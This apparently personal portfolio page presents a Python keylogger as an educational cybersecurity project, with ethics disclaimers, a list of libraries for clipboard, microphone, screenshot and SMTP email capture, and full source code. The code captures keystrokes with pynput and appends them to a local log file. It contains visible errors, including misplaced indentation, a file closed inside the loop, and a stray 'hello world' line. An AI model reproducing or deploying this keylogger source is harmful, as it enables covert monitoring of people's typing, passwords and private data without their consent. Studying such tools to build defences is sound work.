← [Back to Projects](../)

---
title: "Python Keylogging – Cybersecurity Learning Project"
description: "An educational Python project to study keylogging behavior for cybersecurity awareness and defensive learning."
---

<div align="center">

# 🛡️ Python Keylogging  
### *Educational Cybersecurity Learning Project*

![Python](https://img.shields.io/badge/Python-3.x-blue)
![Cybersecurity](https://img.shields.io/badge/Cybersecurity-Education-green)
![Status](https://img.shields.io/badge/Status-Basic%20Version-orange)
![License](https://img.shields.io/badge/License-MIT-purple)

</div>

---

## 🚨 Disclaimer

> ⚠️ **This project is strictly for educational and academic purposes only.**  
> ✔ Developed and tested only on my own system  
> ❌ Not intended for real-world deployment or misuse  
> ⚖️ Unauthorized monitoring or surveillance is illegal and unethical  

This repository is published to **understand how certain threats work so they can be identified, analyzed, and prevented**.

---

## 👋 About This Project

Hello, I’m **Jay Bidve** 👨‍💻  
This project documents my **hands-on learning in cybersecurity using Python**, where I explored how **keylogging mechanisms function at a basic level** and why such behavior is considered risky and is actively monitored by modern security solutions.

The goal of this project is **learning and awareness**, not exploitation.

> 🧠 *In cybersecurity, understanding an attack ethically is essential to building effective defenses.*

---

## 🎯 Project Overview (Current Version)

This is a **basic implementation**, created for learning and conceptual understanding.

### What this project demonstrates:
- ⌨️ Keyboard input event monitoring
- 🖥️ Interaction with system-level resources
- 📂 Local file-based logging
- 🔐 Introduction to encryption concepts
- 🧪 Awareness of how malicious behavior is analyzed

> 🚧 **Version:** Basic (Educational)

---

## ⚙️ Conceptual Working Flow

```text
Keyboard Input
      ↓
Event Listener
      ↓
Readable Conversion
      ↓
Local Logging
      ↓
Safe Termination

```
This conceptual workflow is studied in cybersecurity education to understand:

How malicious software captures user input

Why such behavior triggers security alerts

How defensive tools detect and block similar activity

📚 Libraries Used (Conceptual Explanation)

All libraries are described at a high level only, for transparency and ethical clarity.

⌨️ Keyboard Event Handling

pynput.keyboard
Used to study how applications receive and process keyboard input events.

🖥️ System & Environment Information

socket, platform, getpass
Help understand how software gathers system and user context.

📋 Clipboard Access

win32clipboard
Demonstrates how clipboard data can be accessed and why it poses a security risk.

⏱️ Time & File Utilities

time, os
Used for file handling, timestamps, and path management.

🔐 Cryptography

cryptography.fernet
Introduces symmetric encryption and secure data handling concepts.

🎙️ Audio Input (Conceptual Exposure)

sounddevice, scipy.io.wavfile
Used to learn how applications interact with audio input devices.

📸 Screen Capture (Conceptual Exposure)

PIL.ImageGrab, multiprocessing
Demonstrate how screen data can be captured and how processes run independently.

📧 Email Handling (Awareness Only)

email.mime, smtplib
Studied to understand structured data transmission mechanisms.

🖼️ Screenshots & Demo (Recorded on My System Only)

🎥 Demo Recording


https://github.com/user-attachments/assets/a9c08853-6c3d-47e9-b96e-b8b655595216



---

## 💻 Source Code (Educational Reference)

> ⚠️ **Important Notice**  
> The following code is shared **strictly for educational and academic reference**.  
> It was executed **only on my own system** to understand how keylogging mechanisms work at a basic level.  
> Any use of this code **without explicit consent is unethical and illegal**.

### 📌 Purpose of Including the Code
This section is provided to:
- Demonstrate how such mechanisms are structured
- Help learners understand why this behavior is flagged by security tools
- Support defensive cybersecurity learning

---

### 🧠 Python Implementation

> 🔒 **Note:**  
> This is a **basic learning implementation**, not an advanced or stealth-based system.

```python
#Libraries- Author Jay Bidve
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Now below libraries will help us to grap computer information - Author Jay Bidve

import socket
import platform

# Clipboard

import win32clipboard

from pynput.keyboard import Key , Listener

# for time we have time module

import time
import os

#for microphone
from scipy.io.wavfile import write
import sounddevice as sd

# to encrypt our file we will import crypto

from cryptography.fernet import Fernet

# to get username and more
import getpass
from requests import get

# screenshot utility , 1 at a time

from multiprocessing import Process ,freeze_support

from PIL import ImageGrab

key_information = "key_log.txt"

file_path = "D:\\Keylogger\\Pyhton"
# we added double \\ cuz of escape sequence
extend = "\\"

# each key will be stored in key_log.txt . initalize count as 0 and we created empty list
count = 0
keys = []

def on_press(key):
    global keys , count

    print(key)

    keys.append(key)
    count += 1

    if count >=1:
        count = 0
        write_file(keys)
        keys = []

# this will write each key in file
def write_file(keys):
    with open (file_path + extend + key_information, "a") as f:
# for file manipulations - froe read we do "r" and for append we do "a"
# lets make our collected keys readable

        for key in keys:
        # So when the key will be collected it will store in manner of -- 'h' 'e' 'l' 'l' 'o'  ---  so its not not good , as we wann 'hello' , so to do so
         k = str(key).replace("'","") # 1st we will convert key to string , and we replaced each single quote with nothing , not white space or anything

        # ok now everytime user/ target hits spacebar and the white space appears in code then the next word will be written on next line , to do so -

        if k.find("space") > 0 :
            f.write("\n")
            f.close()
       
        elif k.find("Key")== -1:
            f.write(k)
            f.close()

def on_release(key):
    if key== Key.esc:
        return False # on pressing of esc btn , keylogger will stp
   
#Listener block

with Listener(on_press=on_press, on_release=on_release) as listener :
    listener.join()
hello world
```




🔐 Ethics & Responsibility

This project follows strict ethical guidelines:

✔ Executed only on personal devices
✔ No third-party data collection
✔ No deployment or distribution intent
❌ No unethical or unauthorized usage

Cybersecurity knowledge must always be used responsibly.

🚀 Future Learning Goals

Possible future exploration areas (educational only):

Malware detection techniques

Behavioral analysis

Endpoint security research

Secure coding practices

📜 License

MIT License

This project may be:

Studied

Referenced

Forked for learning

It must not be:

Used for malicious purposes

Deployed without consent

Used to violate privacy or laws

<div align="center">
👤 Jay Bidve

Cybersecurity • Python • Ethical Learning

Build to learn. Learn to defend.

</div>



← [Back to Projects](../)
